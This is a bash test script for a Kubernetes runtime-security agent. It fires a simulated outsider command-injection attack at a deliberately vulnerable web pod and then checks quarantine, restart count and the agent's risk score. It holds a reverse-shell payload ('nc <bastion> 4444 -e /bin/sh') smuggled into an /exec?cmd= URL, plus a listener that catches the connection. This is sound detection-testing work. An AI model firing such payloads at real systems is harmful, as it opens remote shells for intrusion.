#!/usr/bin/env bash
# =============================================================================
# ZTRE Cluster Test — Scenario 1: HTTP Ingress RCE
# Implements doc/ADVANCED_TEST_PLAN.md v1.3.0 / v1.5.0 (Scenario 1)
#
# Simulates true outsider Remote Code Execution via exposed NodePort service.
# Lineage: vulnerable-web -> /bin/sh -c -> nc <bastion> 4444 -e /bin/sh
# Verifies:
#   - Quarantine label ztre/quarantine=true applied
#   - Container stays Running (non-destructive quarantine)
#   - Container restart count is 0
#   - Containment risk score matches effective model (~85.0)
#   - JSON result fragment emitted
# =============================================================================
set -uo pipefail

# ---- Directory and Environment Setup ----------------------------------------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." 2>/dev/null && pwd || pwd)"

# Source common test library if present
if [ -f "${SCRIPT_DIR}/lib/common.sh" ]; then
  # shellcheck source=/dev/null
  source "${SCRIPT_DIR}/lib/common.sh"
elif [ -f "${REPO_ROOT}/tests/cluster/lib/common.sh" ]; then
  # shellcheck source=/dev/null
  source "${REPO_ROOT}/tests/cluster/lib/common.sh"
elif [ -f "${REPO_ROOT}/lib/common.sh" ]; then
  # shellcheck source=/dev/null
  source "${REPO_ROOT}/lib/common.sh"
elif [ -f "lib/common.sh" ]; then
  # shellcheck source=/dev/null
  source "lib/common.sh"
elif [ -f "${SCRIPT_DIR}/advanced_common_setup.sh" ]; then
  # shellcheck source=/dev/null
  source "${SCRIPT_DIR}/advanced_common_setup.sh"
fi

# ---- Default Configuration (ground truth cluster values) ---------------------
NS="${NS:-ztre-test}"
AGENT_NS="${AGENT_NS:-ztre-system}"
AGENT_LABEL="${AGENT_LABEL:-app.kubernetes.io/name=ztre-agent}"
WORKER_IP="${WORKER_IP:-10.91.128.11}"
BASTION_IP="${BASTION_IP:-10.91.128.10}"
NODEPORT="${NODEPORT:-30080}"
RCE_PORT="${RCE_PORT:-4444}"
EVIDENCE_DIR="${EVIDENCE_DIR:-evidence/advanced}"
TS="${TS:-$(date +%Y%m%d-%H%M%S)}"

# Resolve EVIDENCE_DIR relative to REPO_ROOT so relative paths work from any CWD
case "$EVIDENCE_DIR" in
  /*) : ;;
  *) EVIDENCE_DIR="$REPO_ROOT/$EVIDENCE_DIR" ;;
esac
mkdir -p "$EVIDENCE_DIR"
LOG="${LOG:-$EVIDENCE_DIR/run-$TS.log}"

# ---- Helper Fallbacks (if not provided by lib/common.sh) ---------------------
if ! declare -F say >/dev/null 2>&1; then
  say() { echo "$*" | tee -a "$LOG"; }
fi

if ! declare -F hdr >/dev/null 2>&1; then
  hdr() { say ""; say "============================================================"; say "$*"; say "============================================================"; }
fi

if ! declare -F agent_logs >/dev/null 2>&1; then
  agent_logs() { kubectl logs -n "$AGENT_NS" -l "$AGENT_LABEL" --tail=2000 2>/dev/null || true; }
fi

if ! declare -F get_pod >/dev/null 2>&1; then
  get_pod() { kubectl get pod -n "$NS" -l "app=$1" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true; }
fi

# Portable TCP listener via python3 (bastion has NO nc and NO ping)
# tcp_catcher <port> <outfile|-> <seconds>: accept ONE connection, copy bytes.
if ! declare -F tcp_catcher >/dev/null 2>&1; then
  tcp_catcher() {
    python3 - "$1" "$2" "$3" <<'PY'
import socket, sys
port, out, secs = int(sys.argv[1]), sys.argv[2], float(sys.argv[3])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", port))
s.listen(5)
s.settimeout(secs)
try:
    conn, _ = s.accept()
    conn.settimeout(secs)
    f = open(out, "wb") if out != "-" else sys.stdout.buffer
    while True:
        try:
            data = conn.recv(65536)
        except socket.timeout:
            break
        if not data:
            break
        f.write(data); f.flush()
except socket.timeout:
    pass
finally:
    try: s.close()
    except Exception: pass
PY
  }
fi

# Reset agent deduplication cache and clear quarantine label
if ! declare -F reset_agent_and_wait >/dev/null 2>&1; then
  reset_agent_and_wait() {
    local target="$1"
    say "[reset] clearing quarantine label for: $target"
    kubectl label pod -n "$NS" -l "app=$target" ztre/quarantine- --overwrite >/dev/null 2>&1 || \
    kubectl label pod -n "$NS" "$target" ztre/quarantine- --overwrite >/dev/null 2>&1 || true

    say "[reset] restarting ztre-agent daemonset (clears sync.Map dedup cache)"
    kubectl rollout restart daemonset -n "$AGENT_NS" ztre-agent >/dev/null 2>&1 || true
    kubectl rollout status daemonset -n "$AGENT_NS" ztre-agent --timeout=40s >/dev/null 2>&1 || true

    local timeout=20
    local agent_pod
    agent_pod=$(kubectl get pod -n "$AGENT_NS" -l "$AGENT_LABEL" --field-selector=status.phase=Running -o jsonpath='{.items[-1].metadata.name}' 2>/dev/null || true)
    while [ "$timeout" -gt 0 ]; do
      if [ -n "$agent_pod" ]; then
        if kubectl logs -n "$AGENT_NS" "$agent_pod" --tail=50 2>/dev/null | grep -q "Tetragon gRPC event stream established"; then
          say "[reset] agent gRPC stream confirmed open"
          break
        fi
      else
        if agent_logs | grep -q "Tetragon gRPC event stream established"; then
          say "[reset] agent gRPC stream confirmed open"
          break
        fi
      fi
      sleep 1
      timeout=$((timeout - 1))
    done
    sleep 2
  }
fi

# =============================================================================
# SCENARIO 1 — HTTP Ingress Command Injection (True Outsider Attack)
# =============================================================================
run_scenario1() {
  hdr "SCENARIO 1: HTTP Ingress RCE (Outsider Attack)"

  # Step 1: Discover or deploy vulnerable-web pod
  local web_pod
  web_pod=$(get_pod vulnerable-web)
  if [ -z "$web_pod" ]; then
    say "[SC1] vulnerable-web pod not found in $NS; attempting deploy from manifest..."
    local manifest="${REPO_ROOT}/deploy/workloads/vulnerable-web.yaml"
    if [ -f "$manifest" ]; then
      kubectl apply -f "$manifest" >/dev/null 2>&1 || true
      kubectl rollout status deployment/vulnerable-web -n "$NS" --timeout=60s >/dev/null 2>&1 || true
      web_pod=$(get_pod vulnerable-web)
    fi
  fi

  if [ -z "$web_pod" ]; then
    say "[SC1] FAIL: vulnerable-web pod not found in namespace $NS"
    return 1
  fi
  say "[SC1] target pod: $web_pod"

  # Wait for readiness condition
  local ready="False"
  for _ in $(seq 1 20); do
    ready=$(kubectl get pod -n "$NS" "$web_pod" -o jsonpath='{.status.conditions[?(@.type=="Ready")].status}' 2>/dev/null || echo "")
    [ "$ready" = "True" ] && break
    sleep 2
  done
  say "[SC1] target pod Ready: ${ready:-Unknown}"

  # Step 2: Reset agent dedup cache and clear quarantine label
  reset_agent_and_wait vulnerable-web

  # Step 3: Ensure port 4444 listener is ready on bastion (python3 fallback)
  pkill -f "python3.*${RCE_PORT}" 2>/dev/null || true
  sleep 1

  say "[SC1] starting reverse shell receiver on bastion port $RCE_PORT..."
  local catcher_pid
  tcp_catcher "$RCE_PORT" - 10 >/dev/null 2>&1 &
  catcher_pid=$!
  sleep 1

  # Step 4: Fire reverse shell payload via HTTP GET request on NodePort
  # BusyBox syntax: nc <host> <port> -e <prog>
  local rce_payload="nc+${BASTION_IP}+${RCE_PORT}+-e+/bin/sh"
  local target_url="http://${WORKER_IP}:${NODEPORT}/exec?cmd=${rce_payload}"

  say "[SC1] firing exploit payload: nc $BASTION_IP $RCE_PORT -e /bin/sh"
  say "[SC1] request URL: $target_url"
  curl -s -m 8 --connect-timeout 5 "$target_url" >/dev/null 2>&1 || true

  # Step 5: Wait for Tetragon detection and ZTRE agent containment
  say "[SC1] awaiting automated containment (polling quarantine label up to 10s)..."
  local sc1_label=""
  local waited=0
  while [ "$waited" -lt 10 ]; do
    sc1_label=$(kubectl get pod -n "$NS" "$web_pod" -o jsonpath='{.metadata.labels.ztre\/quarantine}' 2>/dev/null || echo "")
    if [ "$sc1_label" = "true" ]; then
      break
    fi
    sleep 1
    waited=$((waited + 1))
  done

  # Clean up background listener
  kill "$catcher_pid" 2>/dev/null || true
  wait "$catcher_pid" 2>/dev/null || true

  # Allow agent log synchronization
  sleep 2

  # Step 6: Query pod status post-containment
  local sc1_phase
  sc1_phase=$(kubectl get pod -n "$NS" "$web_pod" -o jsonpath='{.status.phase}' 2>/dev/null || echo "Unknown")

  local sc1_restarts
  sc1_restarts=$(kubectl get pod -n "$NS" "$web_pod" -o jsonpath='{.status.containerStatuses[0].restartCount}' 2>/dev/null || echo "?")

  # Step 7: Parse containment event and risk score from agent logs
  # Expected effective live scoring model:
  #   Severity S = 100 (reverse_shell)
  #   Context  C = 100 (ANOMALOUS: sh is known parent, nc is unauthorized child)
  #   Asset    A = 25  (ztre-test namespace in low tier)
  #   Total    = 0.50*100 + 0.30*100 + 0.20*25 = 85.0
  local raw_log
  raw_log=$(agent_logs | jq -rR 'fromjson? | select(.msg=="AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY" and .pod=="'"$web_pod"'")' 2>/dev/null | tail -1)

  local sc1_score=""
  local sc1_latency=""
  if [ -n "$raw_log" ]; then
    sc1_score=$(echo "$raw_log" | jq -r '.risk_score // empty' 2>/dev/null || true)
    sc1_latency=$(echo "$raw_log" | jq -r '.latency // empty' 2>/dev/null || true)
  fi

  # Fallback: take the DECISIVE (max) score for this pod, not the last event.
  # The payload 'nc ... -e /bin/sh' scores 85; the intermediate 'sh -c' scores 55.
  # 'tail -1' would grab whichever fired last (non-deterministic).
  if [ -z "$sc1_score" ]; then
    sc1_score=$(agent_logs | jq -rR 'fromjson? | select(.pod=="'"$web_pod"'" and .risk_score != null) | .risk_score' 2>/dev/null | sort -n | tail -1)
  fi

  # Step 8: Verify containment score (~85)
  local score_verified="false"
  if [ -n "$sc1_score" ]; then
    score_verified=$(python3 -c "
try:
    score = float('$sc1_score')
    # Score ~85: check within acceptable boundary [80.0, 90.0]
    print('true' if 80.0 <= score <= 90.0 else 'false')
except Exception:
    print('false')
" 2>/dev/null || echo "false")
  fi

  # Step 9: Determine verdict
  local verdict="FAIL"
  if [ "$sc1_label" = "true" ] && [ "$sc1_phase" = "Running" ] && [ "$sc1_restarts" = "0" ] && [ "$score_verified" = "true" ]; then
    verdict="PASS"
  elif [ "$sc1_label" = "true" ] && [ "$sc1_phase" = "Running" ] && [ "$sc1_restarts" = "0" ]; then
    say "[SC1] WARN: quarantine verified but score ($sc1_score) outside ~85 expected range"
    verdict="PARTIAL_PASS"
  fi

  say "[SC1] ============================================================"
  say "[SC1] Scenario 1 Verification Summary:"
  say "[SC1]   Target Pod             : $web_pod"
  say "[SC1]   Quarantine Label       : ${sc1_label:-<none>} (expected: true)"
  say "[SC1]   Pod Phase              : $sc1_phase (expected: Running)"
  say "[SC1]   Container Restarts     : $sc1_restarts (expected: 0)"
  say "[SC1]   Containment Risk Score : ${sc1_score:-<none>} (expected: ~85)"
  say "[SC1]   Containment Latency    : ${sc1_latency:-<none>}"
  say "[SC1]   Score Verified (~85)   : $score_verified"
  say "[SC1]   Verdict                : $verdict"
  say "[SC1] ============================================================"

  # Step 10: Emit JSON result fragment
  local json_fragment="$EVIDENCE_DIR/scenario1_result-$TS.json"
  local json_canonical="$EVIDENCE_DIR/scenario1_result.json"

  jq -n \
    --arg ts "$TS" \
    --arg scenario "scenario1_ingress_rce" \
    --arg verdict "$verdict" \
    --arg pod "$web_pod" \
    --arg worker_ip "$WORKER_IP" \
    --arg nodeport "$NODEPORT" \
    --arg payload "nc $BASTION_IP $RCE_PORT -e /bin/sh" \
    --arg quar "${sc1_label:-}" \
    --arg phase "$sc1_phase" \
    --arg restarts "$sc1_restarts" \
    --arg score "${sc1_score:-}" \
    --arg latency "${sc1_latency:-}" \
    --arg score_ok "$score_verified" \
    '{
      timestamp: $ts,
      scenario: $scenario,
      verdict: $verdict,
      target_pod: $pod,
      worker_ip: $worker_ip,
      nodeport: ($nodeport | tonumber? // $nodeport),
      payload: $payload,
      quarantine_label: $quar,
      quarantined: ($quar == "true"),
      phase: $phase,
      restarts: ($restarts | tonumber? // $restarts),
      containment_score: (if $score == "" then null else ($score | tonumber? // $score) end),
      containment_latency: (if $latency == "" then null else $latency end),
      score_verified: ($score_ok == "true"),
      scenario1: {
        quarantine_label: $quar,
        phase: $phase,
        restarts: $restarts,
        containment_score: $score,
        containment_latency: $latency,
        verdict: $verdict
      }
    }' > "$json_fragment" 2>/dev/null || true

  cp -f "$json_fragment" "$json_canonical" 2>/dev/null || true
  say "[SC1] JSON result written to: $json_fragment"

  if [ "$verdict" = "PASS" ]; then
    return 0
  elif [ "$verdict" = "PARTIAL_PASS" ]; then
    return 2
  else
    return 1
  fi
}

# If script executed directly rather than sourced, execute run_scenario1
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
  run_scenario1 "$@"
fi
